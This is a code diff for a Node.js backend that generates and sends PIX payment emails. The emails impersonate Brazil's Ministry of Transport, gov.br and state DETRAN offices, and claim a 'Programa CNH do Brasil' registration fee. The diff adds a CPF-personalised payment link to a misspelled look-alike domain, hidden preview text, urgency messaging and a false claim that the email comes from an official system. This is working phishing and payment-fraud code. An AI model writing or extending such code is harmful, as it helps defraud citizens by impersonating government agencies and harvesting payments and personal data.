@@ -84,171 +84,278 @@ async function getMailTransporter() {
   return mailTransporterPromise;
 }
 
-function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl }) {
+function buildPixEmailHtml({
+  nome,
+  pixCode,
+  amountCents,
+  transactionId,
+  cpf,
+  detran,
+  detranBadgeUrl,
+  paymentLink,
+}) {
   const amount = formatCurrencyBRL(amountCents);
-  const safeTitle = title || "Pagamento PIX";
-  const safeName = nome || "Olá";
-  const safeTx = transactionId ? `Transação: ${transactionId}` : "";
+  const safeName = nome || "";
   const safeCpf = cpf ? String(cpf).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
-
-  const logoUrl = process.env.PIX_EMAIL_LOGO_URL || "https://assets.pogramasenatran.org/govbr-logo.png";
-  const headerTitle = process.env.PIX_EMAIL_HEADER_TITLE || "Programa CNH do Brasil";
-  const headerSubtitle = process.env.PIX_EMAIL_HEADER_SUBTITLE || "Inscrição ativa";
-  const headerRightLogo = process.env.PIX_EMAIL_HEADER_RIGHT_LOGO || "";
-  const headerRightBadge = detranBadgeUrl || process.env.PIX_EMAIL_HEADER_BADGE_URL || "";
-  const headerLine1 = process.env.PIX_EMAIL_HEADER_LINE1 || "Ministério dos Transportes";
-  const headerLine2 = process.env.PIX_EMAIL_HEADER_LINE2 || "Secretaria Nacional de Trânsito";
-  const buttonLabel = process.env.PIX_EMAIL_BUTTON_LABEL || "REALIZAR PAGAMENTO";
   const detranLabel = detran || process.env.PIX_EMAIL_DETRAN_LABEL || "DETRAN/AC";
   const expiresText = process.env.PIX_EMAIL_EXPIRES_TEXT || "Expira em 24 horas";
-  const footerLogo = process.env.PIX_EMAIL_FOOTER_LOGO || "https://assets.pogramasenatran.org/govbr-logo.png";
+  const headerBadge = detranBadgeUrl || "";
 
-  return `
-  <div style="margin:0; padding:0; background:#e9f1fb; font-family:Arial, Helvetica, sans-serif; color:#0b0b0b; line-height:1.4;">
-    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background:#e9f1fb;">
-      <tr>
-        <td style="background:#dbe6f5; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
-      </tr>
-      <tr>
-        <td style="background:#e9f1fb; padding:0 12px;">
-          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
-            <tr>
-              <td align="center">
-                <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
-            <tr>
-              <td style="background:#0b2a57; padding:0;">
-                <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
-                  <tr>
-                    <td style="background:#0b2a57; padding:0;">
-                      <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
-                        <tr>
-                          <td style="background:#1ea35a; width:22%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
-                          <td style="background:#f7c325; width:22%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
-                          <td style="background:#0b2a57; width:56%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
-                        </tr>
-                      </table>
-                    </td>
-                  </tr>
-                </table>
-                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="padding:14px 20px 16px;">
-                  <tr>
-                    <td style="text-align:left; width:40%; vertical-align:top;">
-                      <table role="presentation" cellpadding="0" cellspacing="0">
-                        <tr>
-                          <td style="padding-right:8px;">
-                            <img src="${logoUrl}" alt="Logo" style="max-height:28px; display:block;" />
-                          </td>
-                          <td style="border-left:1px solid rgba(255,255,255,0.25); padding-left:8px;">
-                            <div style="color:#ffffff; font-size:10px; font-weight:600;">${headerLine1}</div>
-                            <div style="color:#cfe0ff; font-size:9px; margin-top:2px;">${headerLine2}</div>
-                          </td>
-                        </tr>
-                      </table>
-                    </td>
-                    <td style="text-align:right; vertical-align:top;">
-                      ${headerRightBadge ? `
-                        <div style=\"display:inline-block; background:#ffffff; padding:4px 6px; border-radius:6px;\">
-                          <img src=\"${headerRightBadge}\" alt=\"\" style=\"max-height:26px; display:block;\" />
-                        </div>
-                      ` : (headerRightLogo ? `<img src="${headerRightLogo}" alt="" style="max-height:28px; display:inline-block;" />` : "")}
-                    </td>
-                  </tr>
-                </table>
-                <div style="color:#ffffff; font-weight:700; font-size:16px; padding:0 20px 2px;">Programa <span style=\"background:#f7c325; color:#0b2a57; padding:2px 4px; border-radius:3px;\">CNH</span> do Brasil</div>
-                <div style="color:#8dd39c; font-size:11px; padding:0 20px 14px;">• ${headerSubtitle}</div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:16px 20px 0;">
-                <div style="background:#fff5d6; border:1px solid #ffe1a3; color:#6b4b00; padding:10px 12px; border-radius:8px; font-size:12px;">
-                  <span style="display:inline-block; width:18px; height:18px; border-radius:50%; background:#f59e0b; color:#fff; text-align:center; line-height:18px; font-weight:700; margin-right:6px;">!</span>
-                  <strong>Ação necessária, ${safeName}.</strong><br />
-                  Sua inscrição aguarda confirmação de pagamento.
-                </div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:16px 20px 6px;">
-                <div style="font-size:11px; color:#7a8aa0; letter-spacing:0.4px;">DADOS DO INSCRITO</div>
-                <div style="background:#f7f9fc; border:1px solid #e6eef7; padding:12px; border-radius:10px; margin-top:8px;">
-                  <div style="font-weight:700; font-size:13px; text-transform:uppercase;">${safeName}</div>
-                  <div style="font-size:12px; color:#64748b; margin-top:4px;">
-                    ${safeCpf ? `CPF: ${safeCpf}` : ""}${safeCpf ? " · " : ""}${detranLabel}
-                  </div>
-                </div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:8px 20px 0;">
-                <div style="background:linear-gradient(180deg,#2b5bd8 0%, #1f4fbf 100%); border-radius:12px; padding:18px; text-align:center; color:#ffffff;">
-                  <div style="font-size:11px; letter-spacing:0.6px; opacity:0.85;">${safeTitle.toUpperCase()}</div>
-                  <div style="font-size:30px; font-weight:700; margin:6px 0 8px;">${amount}</div>
-                  <div style="display:inline-block; background:#1e40af; color:#fff; border-radius:999px; padding:4px 10px; font-size:10px;">
-                    ⏳ ${expiresText}
-                  </div>
-                </div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:14px 20px 0; text-align:center;">
-                <a href="#" style="background:#1db954; color:#ffffff; text-decoration:none; padding:12px 18px; border-radius:10px; font-weight:700; display:inline-block; font-size:13px; letter-spacing:0.4px;">
-                  ${buttonLabel}
-                </a>
-                <div style="font-size:11px; color:#64748b; margin-top:8px;">Atenção: pagamento via PIX</div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:18px 20px 0;">
-                <div style="font-weight:700; font-size:12px; color:#0f172a;">Ou copie o código PIX:</div>
-                <div style="margin-top:8px; padding:12px; background:#f8fafc; border:1px dashed #cbd5e1; border-radius:10px; font-size:12px; word-break:break-all; color:#1f2937;">${pixCode}</div>
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:14px 20px 20px;">
-                <div style="background:#e7f8ee; border:1px solid #bfe7d1; border-radius:10px; padding:12px; font-size:12px; color:#0f5132;">
-                  <div style="font-weight:700; margin-bottom:6px;">Como pagar via PIX:</div>
-                  <ol style="margin:0; padding-left:18px;">
-                    <li>Abra o app do seu banco</li>
-                    <li>Acesse a área PIX</li>
-                    <li>Clique em “Pagar” ou “Copia e Cola”</li>
-                    <li>Cole o código e confirme</li>
-                  </ol>
-                </div>
-              </td>
-            </tr>
-            <tr>
-              <td style="background:#0b1b35; padding:18px 20px; text-align:center;">
-                <img src="${footerLogo}" alt="" style="max-height:28px; display:block; margin:0 auto 8px;" />
-                <div style="color:#cbd5e1; font-size:11px;">Ministério dos Transportes</div>
-                <div style="color:#94a3b8; font-size:10px; margin-top:4px;">Governo Federal · União e Reconstrução</div>
-                ${safeTx ? `<div style="margin-top:10px; font-size:10px; color:#94a3b8;">Protocolo: ${transactionId}</div>` : ""}
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:12px 20px 0; text-align:center; font-size:10px; color:#7b8798;">
-                Este email foi enviado pelo sistema oficial do Programa CNH do Brasil.
-              </td>
-            </tr>
-            <tr>
-              <td style="padding:6px 20px 18px; text-align:center; font-size:10px; color:#9aa6b2;">
-                Em caso de dúvidas, acesse detran.programasnatrans.org
-              </td>
-            </tr>
-                </table>
-              </td>
-            </tr>
-          </table>
-        </td>
-      </tr>
-      <tr>
-        <td style="background:#f4f7fb; height:24px; line-height:24px; font-size:0;">&nbsp;</td>
-      </tr>
-    </table>
+  return `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>Lembrete de Pagamento - CNH do Brasil</title>
+  <!--[if mso]>
+  <noscript>
+    <xml>
+      <o:OfficeDocumentSettings>
+        <o:PixelsPerInch>96</o:PixelsPerInch>
+      </o:OfficeDocumentSettings>
+    </xml>
+  </noscript>
+  <![endif]-->
+</head>
+<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e8eef3; -webkit-font-smoothing: antialiased;">
+  <div style="display: none; max-height: 0; overflow: hidden; mso-hide: all;">
+    ${safeName}, sua inscricao no Programa CNH do Brasil aguarda pagamento. Conclua agora!
   </div>
-  `;
+  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #e8eef3;">
+    <tr>
+      <td align="center" style="padding: 32px 16px;">
+        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width: 580px; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 24px rgba(0,0,0,0.12);">
+          <tr>
+            <td>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="height: 6px; background: linear-gradient(90deg, #009739 0%, #009739 33%, #FEDD00 33%, #FEDD00 66%, #002776 66%, #002776 100%);"></td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background: linear-gradient(180deg, #0c326f 0%, #1351B4 100%); padding: 28px 32px;">
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td>
+                    <table role="presentation" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td style="vertical-align: middle;">
+                          <img src="https://assets.pogramasenatran.org/govbr-logo.png" alt="gov.br" style="height: 36px; width: auto;" />
+                        </td>
+                        <td style="vertical-align: middle; padding-left: 20px;">
+                          <table role="presentation" cellspacing="0" cellpadding="0">
+                            <tr>
+                              <td style="border-left: 2px solid rgba(255,255,255,0.25); padding-left: 20px;">
+                                <p style="color: #ffffff; font-size: 13px; font-weight: 600; margin: 0; line-height: 1.3;">Ministerio dos Transportes</p>
+                                <p style="color: rgba(255,255,255,0.7); font-size: 11px; margin: 2px 0 0 0;">Secretaria Nacional de Transito</p>
+                              </td>
+                            </tr>
+                          </table>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                  <td style="text-align: right; vertical-align: middle;">
+                    <div style="display: inline-block; background-color: #ffffff; border-radius: 6px; padding: 6px; border: 1px solid #e2e8f0;">
+                      <img src="${headerBadge}" alt="" width="80" height="40" style="display: block; width: 80px; height: 40px; object-fit: contain; border: 0;" />
+                    </div>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background: linear-gradient(135deg, #071D41 0%, #0c326f 100%); padding: 0;">
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 24px 32px 20px 32px;">
+                    <h1 style="color: #ffffff; font-size: 24px; font-weight: 700; margin: 0; letter-spacing: -0.3px;">Programa CNH do Brasil</h1>
+                    <p style="color: #68d391; font-size: 12px; font-weight: 500; margin: 6px 0 0 0; text-transform: uppercase; letter-spacing: 0.5px;">● Inscricao Ativa</p>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background-color: #fff8e1; padding: 20px 32px; border-bottom: 3px solid #ffb300;">
+              <table role="presentation" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="vertical-align: top; padding-right: 14px;">
+                    <div style="width: 28px; height: 28px; background-color: #ff9800; border-radius: 50%; text-align: center; line-height: 28px;">
+                      <span style="color: #ffffff; font-size: 16px; font-weight: bold;">!</span>
+                    </div>
+                  </td>
+                  <td style="vertical-align: middle;">
+                    <p style="color: #e65100; font-size: 15px; font-weight: 700; margin: 0;">Acao necessaria, ${safeName}</p>
+                    <p style="color: #795548; font-size: 13px; margin: 4px 0 0 0;">Sua inscricao aguarda confirmacao de pagamento.</p>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background-color: #ffffff; padding: 0;">
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 28px 32px 24px 32px;">
+                    <p style="color: #78909c; font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 12px 0; font-weight: 600;">Dados do Inscrito</p>
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f8fafc; border-radius: 8px; border: 1px solid #e2e8f0;">
+                      <tr>
+                        <td style="padding: 18px 20px;">
+                          <p style="color: #1e293b; font-size: 17px; font-weight: 700; margin: 0;">${safeName}</p>
+                          <p style="color: #64748b; font-size: 13px; margin: 6px 0 0 0;">CPF: ${safeCpf} &nbsp;•&nbsp; ${detranLabel}</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 0 32px 28px 32px;">
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: linear-gradient(135deg, #1e40af 0%, #1d4ed8 50%, #2563eb 100%); border-radius: 12px; overflow: hidden;">
+                      <tr>
+                        <td style="padding: 28px 24px; text-align: center;">
+                          <p style="color: rgba(255,255,255,0.85); font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 8px 0; font-weight: 500;">Taxa de Inscricao</p>
+                          <p style="color: #ffffff; font-size: 44px; font-weight: 800; margin: 0; letter-spacing: -1px;">${amount}</p>
+                          <table role="presentation" cellspacing="0" cellpadding="0" style="margin: 16px auto 0 auto;">
+                            <tr>
+                              <td style="background-color: rgba(0,0,0,0.2); border-radius: 20px; padding: 8px 16px;">
+                                <p style="color: #fbbf24; font-size: 12px; font-weight: 600; margin: 0;">⏰ ${expiresText}</p>
+                              </td>
+                            </tr>
+                          </table>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 0 32px 20px 32px;">
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td style="border-radius: 10px; background: linear-gradient(135deg, #16a34a 0%, #22c55e 100%);" align="center">
+                          <a href="${paymentLink}" target="_blank" style="display: block; color: #ffffff; text-decoration: none; padding: 18px 32px; font-size: 16px; font-weight: 700; letter-spacing: 0.3px;">REALIZAR PAGAMENTO</a>
+                        </td>
+                      </tr>
+                    </table>
+                    <p style="color: #9ca3af; font-size: 11px; text-align: center; margin: 12px 0 0 0;">Ambiente seguro • Pagamento via PIX</p>
+                  </td>
+                </tr>
+              </table>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 8px 32px;">
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td style="border-bottom: 1px dashed #e2e8f0;"></td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 20px 32px 28px 32px;">
+                    <p style="color: #475569; font-size: 13px; font-weight: 600; margin: 0 0 10px 0;">Ou copie o codigo PIX:</p>
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f1f5f9; border: 1px solid #cbd5e1; border-radius: 6px;">
+                      <tr>
+                        <td style="padding: 14px;">
+                          <p style="font-family: 'Courier New', Courier, monospace; font-size: 10px; word-break: break-all; color: #334155; margin: 0; line-height: 1.5;">${pixCode}</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="padding: 0 32px 32px 32px;">
+                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #ecfdf5; border-radius: 10px; border: 1px solid #a7f3d0;">
+                      <tr>
+                        <td style="padding: 20px 24px;">
+                          <p style="color: #047857; font-size: 13px; font-weight: 700; margin: 0 0 14px 0;">Como pagar via PIX:</p>
+                          <table role="presentation" cellspacing="0" cellpadding="0">
+                            <tr>
+                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">1.</td>
+                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Abra o app do seu banco</td>
+                            </tr>
+                            <tr>
+                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">2.</td>
+                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Acesse a area PIX</td>
+                            </tr>
+                            <tr>
+                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">3.</td>
+                              <td style="color: #065f46; font-size: 13px; padding-bottom: 8px;">Clique em "Pagar" ou "Copia e Cola"</td>
+                            </tr>
+                            <tr>
+                              <td style="vertical-align: top; padding-right: 10px; color: #10b981; font-weight: 600; font-size: 13px;">4.</td>
+                              <td style="color: #065f46; font-size: 13px;">Cole o codigo e confirme</td>
+                            </tr>
+                          </table>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td style="background: linear-gradient(180deg, #0f172a 0%, #1e293b 100%); padding: 28px 32px;">
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="text-align: center;">
+                    <img src="https://assets.pogramasenatran.org/govbr-logo.png" alt="gov.br" style="height: 28px; width: auto; margin-bottom: 14px; opacity: 0.9;" />
+                    <p style="color: #e2e8f0; font-size: 13px; font-weight: 600; margin: 0;">Ministerio dos Transportes</p>
+                    <p style="color: #94a3b8; font-size: 11px; margin: 4px 0 16px 0;">Governo Federal • Uniao e Reconstrucao</p>
+                    <table role="presentation" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
+                      <tr>
+                        <td style="background-color: rgba(255,255,255,0.08); border-radius: 4px; padding: 8px 14px;">
+                          <p style="color: #64748b; font-size: 10px; margin: 0; font-family: monospace;">Protocolo: ${transactionId || ""}</p>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <tr>
+            <td>
+              <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td style="height: 5px; background: linear-gradient(90deg, #002776 0%, #002776 33%, #FEDD00 33%, #FEDD00 66%, #009739 66%, #009739 100%);"></td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+        </table>
+        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="max-width: 580px;">
+          <tr>
+            <td style="padding: 24px 16px; text-align: center;">
+              <p style="color: #94a3b8; font-size: 11px; margin: 0; line-height: 1.6;">
+                Este email foi enviado pelo sistema oficial do Programa CNH do Brasil.<br>
+                Em caso de duvidas, acesse
+                <a href="https://detran.pogramasenatran.org" style="color: #3b82f6; text-decoration: none;">detran.pogramasenatran.org</a>
+              </p>
+              <p style="color: #cbd5e1; font-size: 10px; margin: 12px 0 0 0;">© 2026 Ministerio dos Transportes</p>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
 }
 
-async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl }) {
+async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl, paymentLink }) {
   const transporter = await getMailTransporter();
   if (!to) {
     console.warn("[PAYMENT] Email PIX não enviado: destinatário vazio");
@@ -266,13 +373,12 @@ async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, tra
   const html = buildPixEmailHtml({
     nome,
     pixCode,
-    qrCode,
     amountCents,
-    title,
     transactionId,
     cpf,
     detran,
     detranBadgeUrl,
+    paymentLink,
   });
 
   const info = await transporter.sendMail({
@@ -495,6 +601,9 @@ async function handlePaymentRequest(req, res) {
       .trim()
       .toUpperCase();
     const detranBadgeUrl = detranUf ? DETRAN_BADGE_BY_UF[detranUf] || "" : "";
+    const cpfDigits = (customer.taxId || "").toString().replace(/\D/g, "");
+    const paymentLinkBase = process.env.PIX_PAYMENT_LINK_BASE || "https://detran.pogramasenatran.org";
+    const paymentLink = cpfDigits ? `${paymentLinkBase}/${cpfDigits}` : paymentLinkBase;
     const tracking = (() => {
       if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
         const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
@@ -704,6 +813,7 @@ async function handlePaymentRequest(req, res) {
         cpf: customer.taxId || "",
         detran: detranFromBody || "",
         detranBadgeUrl,
+        paymentLink,
       });
     } catch (mailError) {
       console.error("[PAYMENT] Falha ao enviar email PIX:", mailError.message || mailError);
